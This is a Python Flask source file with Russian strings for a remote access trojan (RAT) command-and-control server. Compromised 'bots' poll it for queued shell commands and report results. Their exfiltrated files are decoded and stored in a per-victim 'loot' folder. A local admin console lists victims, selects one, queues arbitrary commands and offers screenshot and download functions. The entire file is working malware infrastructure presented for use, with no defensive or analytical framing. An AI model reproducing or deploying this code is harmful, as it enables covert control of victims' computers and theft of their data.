# ==================== ПОЛНЫЙ server.py С HEARTBEAT, УВЕДОМЛЕНИЯМИ И СТАТУСОМ ====================
from flask import Flask, request, Response
import threading, time, re, secrets, socket, sys, os, subprocess, base64
from datetime import datetime, timedelta
from collections import deque

app = Flask(__name__)

ADMIN_TOKEN = secrets.token_hex(16)
SESSION_TIMEOUT = 120
CLEANUP_INTERVAL = 60
MAX_QUEUE = 50
ADMIN_PORT = 9999
HEARTBEAT_TIMEOUT = 60

clients = {}
clients_lock = threading.Lock()

@app.route('/cmd', methods=['GET'])
def get_cmd():
    uid = request.headers.get('X-Client-UID', '')
    if not uid or not re.match(r'^[A-Za-z0-9\-_]{1,64}$', uid):
        return Response("BAD_UID", status=400)
    now = datetime.utcnow()
    with clients_lock:
        if uid not in clients:
            clients[uid] = {
                "ip": request.remote_addr,
                "first_seen": now,
                "last_seen": now,
                "last_heartbeat": now,
                "status": "online",
                "queue": deque(maxlen=MAX_QUEUE),
                "cwd": "?",
            }
            notify_admins(f"\n[+] НОВЫЙ БОТ ПОДКЛЮЧИЛСЯ!\n"
                         f"    UID: {uid}\n"
                         f"    IP:  {request.remote_addr}\n"
                         f"    Время: {now.strftime('%Y-%m-%d %H:%M:%S')}\n"
                         f"    Статус: ОНЛАЙН\n")
        else:
            clients[uid]["last_seen"] = now
            clients[uid]["last_heartbeat"] = now
            clients[uid]["ip"] = request.remote_addr
            if clients[uid]["status"] == "offline":
                clients[uid]["status"] = "online"
                notify_admins(f"[↻] Бот [{uid}] снова в ОНЛАЙНЕ\n")
        q = clients[uid]["queue"]
        try:
            cmd = q.popleft()
        except IndexError:
            cmd = ""
    return Response(cmd, mimetype='text/plain; charset=utf-8')

@app.route('/heartbeat', methods=['GET'])
def heartbeat():
    uid = request.headers.get('X-Client-UID', '')
    if not uid or not re.match(r'^[A-Za-z0-9\-_]{1,64}$', uid):
        return Response("BAD_UID", status=400)
    now = datetime.utcnow()
    with clients_lock:
        if uid in clients:
            clients[uid]["last_heartbeat"] = now
            if clients[uid]["status"] == "offline":
                clients[uid]["status"] = "online"
                clients[uid]["last_seen"] = now
                notify_admins(f"[↻] Бот [{uid}] снова в ОНЛАЙНЕ (heartbeat)\n")
        else:
            clients[uid] = {
                "ip": request.remote_addr,
                "first_seen": now,
                "last_seen": now,
                "last_heartbeat": now,
                "status": "online",
                "queue": deque(maxlen=MAX_QUEUE),
                "cwd": "?",
            }
            notify_admins(f"\n[+] НОВЫЙ БОТ ПОДКЛЮЧИЛСЯ (heartbeat)!\n"
                         f"    UID: {uid}\n"
                         f"    IP:  {request.remote_addr}\n"
                         f"    Время: {now.strftime('%Y-%m-%d %H:%M:%S')}\n"
                         f"    Статус: ОНЛАЙН\n")
    return Response("OK", status=200)

@app.route('/res', methods=['POST'])
def post_res():
    uid = request.headers.get('X-Client-UID', 'unknown')
    raw = request.get_data()
    
    try:
        text = raw.decode('utf-8')
    except (UnicodeDecodeError, LookupError):
        try:
            text = raw.decode('cp866')
        except (UnicodeDecodeError, LookupError):
            try:
                text = raw.decode('windows-1251', errors='replace')
            except (UnicodeDecodeError, LookupError):
                text = raw.decode('latin-1', errors='replace')
    
    now = datetime.utcnow()
    with clients_lock:
        if uid in clients:
            clients[uid]["last_seen"] = now
            clients[uid]["last_heartbeat"] = now
            cwd_match = re.match(r'^CWD:\s*(.+)$', text, re.MULTILINE)
            if cwd_match:
                clients[uid]["cwd"] = cwd_match.group(1).strip()
                text = re.sub(r'^CWD:.*\n?', '', text, count=1, flags=re.MULTILINE).strip()

    download_match = re.search(r'\[DOWNLOAD_START\](.*?)\[DOWNLOAD_END\]', text, re.DOTALL)
    if download_match:
        content = download_match.group(1)
        file_match = re.search(r'FILE:(.+)', content)
        size_match = re.search(r'SIZE:(\d+)', content)
        b64_match = re.search(r'BASE64:\n(.+)', content, re.DOTALL)

        if file_match and b64_match:
            filename = file_match.group(1).strip()
            b64_data = b64_match.group(1).strip().replace('\n', '').replace('\r', '').replace(' ', '')
            size = int(size_match.group(1)) if size_match else 0

            try:
                file_data = base64.b64decode(b64_data)
            except Exception as e:
                file_data = b''
                print(f"[!] Ошибка декодирования base64 от {uid}: {e}")

            if getattr(sys, 'frozen', False):
                base_dir = os.path.dirname(sys.executable)
            else:
                base_dir = os.path.dirname(os.path.abspath(__file__))
            loot_dir = os.path.join(base_dir, 'loot', uid)
            os.makedirs(loot_dir, exist_ok=True)
            save_path = os.path.join(loot_dir, filename)

            with open(save_path, 'wb') as f:
                f.write(file_data)

            text = re.sub(
                r'\[DOWNLOAD_START\].*?\[DOWNLOAD_END\]',
                f'[✓] Файл сохранён: loot/{uid}/{filename} ({size} байт)',
                text,
                count=1,
                flags=re.DOTALL
            )
            print(f"[*] Скачан файл от {uid}: {filename} ({size} байт) -> loot/{uid}/")

    for conn_info in list(admin_connections):
        conn, active_uid = conn_info
        if active_uid == uid:
            cwd = clients[uid]["cwd"] if uid in clients else "?"
            prompt = f"\r\n[{uid}] {cwd}> "
            full_msg = f"\n[←] Ответ от [{uid}]:\n{text}\n{prompt}"
        else:
            full_msg = f"\n[←] Ответ от [{uid}]:\n{text}\n"
        try:
            conn.sendall(full_msg.encode('utf-8'))
        except:
            pass
    return "OK", 200

def notify_admins(message):
    for conn_info in list(admin_connections):
        conn, _ = conn_info
        try:
            conn.sendall(message.encode('utf-8'))
        except:
            pass

def cleanup():
    while True:
        time.sleep(CLEANUP_INTERVAL)
        now = datetime.utcnow()
        with clients_lock:
            dead = []
            for uid, d in clients.items():
                heartbeat_age = (now - d["last_heartbeat"]).seconds
                if heartbeat_age > HEARTBEAT_TIMEOUT:
                    if d["status"] == "online":
                        d["status"] = "offline"
                        notify_admins(f"[−] Бот [{uid}] УШЁЛ В ОФФЛАЙН (heartbeat timeout: {heartbeat_age}с)\n")
                
                session_age = (now - d["last_seen"]).seconds
                if session_age > SESSION_TIMEOUT:
                    dead.append(uid)
            
            for uid in dead:
                del clients[uid]
                notify_admins(f"[✕] Сессия [{uid}] удалена по таймауту ({SESSION_TIMEOUT}с неактивности)\n")

admin_connections = []
admin_lock = threading.Lock()

def handle_admin_console(conn: socket.socket, addr):
    conn_entry = [conn, None]
    with admin_lock:
        admin_connections.append(conn_entry)

    welcome = (
        "\r\n"
        "========================================\r\n"
        "   RAT C2 КОНСОЛЬ УПРАВЛЕНИЯ\r\n"
        "========================================\r\n"
        "  list              — список ботов\r\n"
        "  connect <UID>     — выбрать бота\r\n"
        "  back              — отключиться\r\n"
        "  kill <UID>        — удалить бота\r\n"
        "  screenshot        — скриншот экрана\r\n"
        "  download <путь>   — скачать файл/папку\r\n"
        "  help              — справка\r\n"
        "  clear             — очистить консоль\r\n"
        "  exit              — выход\r\n"
        "========================================\r\n"
        f"  Токен: {ADMIN_TOKEN}\r\n"
        "========================================\r\n"
        "\r\n"
        "[]> "
    )
    try:
        conn.sendall(welcome.encode('utf-8'))
    except:
        return

    try:
        while True:
            try:
                data = conn.recv(4096)
            except:
                break
            if not data:
                break
            raw = data.decode('utf-8', errors='replace').strip()
            if not raw:
                continue

            parts = raw.split(maxsplit=1)
            key = parts[0].lower()
            active = conn_entry[1]

            if key == "exit":
                conn.sendall("[!] Отключение от консоли.\r\n".encode('utf-8'))
                break

            elif key == "list":
                with clients_lock:
                    if not clients:
                        conn.sendall("[*] Нет активных сессий.\r\n".encode('utf-8'))
                    else:
                        header = "\r\n" + "=" * 75 + "\r\n"
                        header += f" {'UID':<35} {'IP':<16} {'СТАТУС':<10} {'АКТИВНОСТЬ':>10}\r\n"
                        header += "-" * 75 + "\r\n"
                        now = datetime.utcnow()
                        for u, d in clients.items():
                            ago = (now - d["last_seen"]).seconds
                            status_icon = "ON" if d["status"] == "online" else "OFF"
                            status_text = "ОНЛАЙН" if d["status"] == "online" else "ОФФЛАЙН"
                            header += f" {u:<35} {d['ip']:<16} {status_icon} {status_text:<7} {f'{ago}c':>10}\r\n"
                        header += "=" * 75 + "\r\n"
                        conn.sendall(header.encode('utf-8'))
                prompt = f"\r\n[{active}] {clients[active]['cwd']}> " if active and active in clients else "\r\n[]> "
                conn.sendall(prompt.encode('utf-8'))

            elif key == "connect":
                if len(parts) < 2:
                    conn.sendall("[!] connect <UID>\r\n".encode('utf-8'))
                else:
                    target = parts[1]
                    with clients_lock:
                        if target in clients:
                            conn_entry[1] = target
                            active = target
                            status = clients[target]["status"]
                            conn.sendall(f"[+] Подключено к {target} (Статус: {status})\r\n".encode('utf-8'))
                        else:
                            conn.sendall(f"[!] Сессия {target} не найдена.\r\n".encode('utf-8'))
                prompt = f"\r\n[{active}] {clients[active]['cwd']}> " if active and active in clients else "\r\n[]> "
                conn.sendall(prompt.encode('utf-8'))

            elif key == "back":
                if active:
                    conn.sendall(f"[-] Отключено от {active}\r\n".encode('utf-8'))
                    conn_entry[1] = None
                    active = None
                else:
                    conn.sendall("[!] Нет активной сессии.\r\n".encode('utf-8'))
                prompt = "\r\n[]> "
                conn.sendall(prompt.encode('utf-8'))

            elif key == "kill":
                if len(parts) < 2:
                    conn.sendall("[!] kill <UID>\r\n".encode('utf-8'))
                else:
                    target = parts[1]
                    with clients_lock:
                        if target in clients:
                            del clients[target]
                            conn.sendall(f"[−] Сессия {target} удалена.\r\n".encode('utf-8'))
                            if active == target:
                                conn_entry[1] = None
                                active = None
                            notify_admins(f"[✕] Администратор удалил сессию [{target}]\n")
                        else:
                            conn.sendall(f"[!] Сессия {target} не найдена.\r\n".encode('utf-8'))
                prompt = f"\r\n[{active}] {clients[active]['cwd']}> " if active and active in clients else "\r\n[]> "
                conn.sendall(prompt.encode('utf-8'))

            elif key == "help":
                conn.sendall("list | connect <UID> | back | kill <UID> | screenshot | download <путь> | help | clear | exit\r\n".encode('utf-8'))
                prompt = f"\r\n[{active}] {clients[active]['cwd']}> " if active and active in clients else "\r\n[]> "
                conn.sendall(prompt.encode('utf-8'))

            elif key == "clear":
                clear_ansi = "\033[2J\033[H"
                try:
                    conn.sendall(clear_ansi.encode('utf-8'))
                except:
                    pass
                header_short = (
                    "========================================\r\n"
                    "   RAT C2 КОНСОЛЬ УПРАВЛЕНИЯ\r\n"
                    "========================================\r\n"
                    f"  Токен: {ADMIN_TOKEN}\r\n"
                    "========================================\r\n"
                    "\r\n"
                )
                try:
                    conn.sendall(header_short.encode('utf-8'))
                except:
                    break
                if active and active in clients:
                    with clients_lock:
                        cwd = clients[active]["cwd"] if active in clients else "?"
                    prompt = f"[{active}] {cwd}> "
                else:
                    prompt = "[]> "
                try:
                    conn.sendall(prompt.encode('utf-8'))
                except:
                    break
                continue

            else:
                if not active or active not in clients:
                    conn.sendall("[!] Сначала connect <UID>\r\n".encode('utf-8'))
                    prompt = "\r\n[]> "
                    conn.sendall(prompt.encode('utf-8'))
                else:
                    with clients_lock:
                        if active in clients:
                            if clients[active]["status"] == "offline":
                                conn.sendall(f"[!] ВНИМАНИЕ: Бот [{active}] ОФФЛАЙН. Команда будет выполнена при появлении в сети.\r\n".encode('utf-8'))
                            clients[active]["queue"].append(raw)
                            conn.sendall(f"[→] Команда отправлена боту {active}\r\n".encode('utf-8'))
                        else:
                            conn.sendall("[!] Бот отключился.\r\n".encode('utf-8'))
                            conn_entry[1] = None
                            conn.sendall("\r\n[]> ".encode('utf-8'))

    except Exception as e:
        print(f"[!] Ошибка в консоли администратора {addr}: {e}")
    finally:
        with admin_lock:
            if conn_entry in admin_connections:
                admin_connections.remove(conn_entry)
        try:
            conn.close()
        except:
            pass

def admin_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", ADMIN_PORT))
    srv.listen(5)
    print(f"[*] Консоль управления: 127.0.0.1:{ADMIN_PORT}")
    while True:
        conn, addr = srv.accept()
        print(f"[*] Администратор подключился: {addr}")
        threading.Thread(target=handle_admin_console, args=(conn, addr), daemon=True).start()

ADMIN_CLIENT_SCRIPT = f'''
import socket, sys, threading

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect(("127.0.0.1", {ADMIN_PORT}))
except Exception as e:
    print(f"Ошибка подключения: {{e}}")
    input("Нажмите Enter для выхода...")
    sys.exit(1)

print("Подключено к серверу управления RAT. Введите exit для выхода.\\n")
sys.stdout.flush()

def reader():
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            text = data.decode('utf-8', errors='replace')
            sys.stdout.buffer.write(text.encode(sys.stdout.encoding, errors='replace'))
            sys.stdout.buffer.flush()
        except:
            break

t = threading.Thread(target=reader, daemon=True)
t.start()

try:
    while True:
        cmd = input()
        if cmd.strip().lower() == "exit":
            break
        try:
            sock.sendall((cmd + "\\r\\n").encode('utf-8'))
        except:
            break
except (KeyboardInterrupt, EOFError):
    pass
finally:
    sock.close()
'''

def open_admin_cmd():
    time.sleep(1.5)
    if sys.platform == "win32":
        script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_admin_client.py")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(ADMIN_CLIENT_SCRIPT)
        os.system(f'start "RAT УПРАВЛЕНИЕ" cmd /k "chcp 65001 >nul & python \"{script_path}\""')
    else:
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
            f.write(ADMIN_CLIENT_SCRIPT)
            f.flush()
            os.system(f'x-terminal-emulator -e python3 "{f.name}"')

if __name__ == "__main__":
    print(f"[*] RAT C2 Сервер")
    print(f"[*] Flask: http://0.0.0.0:8080")
    print(f"[*] Консоль управления: 127.0.0.1:{ADMIN_PORT}")
    print(f"[*] Токен: {ADMIN_TOKEN}")

    threading.Thread(target=admin_server, daemon=True).start()
    threading.Thread(target=cleanup, daemon=True).start()
    threading.Thread(target=open_admin_cmd, daemon=True).start()

    app.run(host="0.0.0.0", port=8080, threaded=True, debug=False)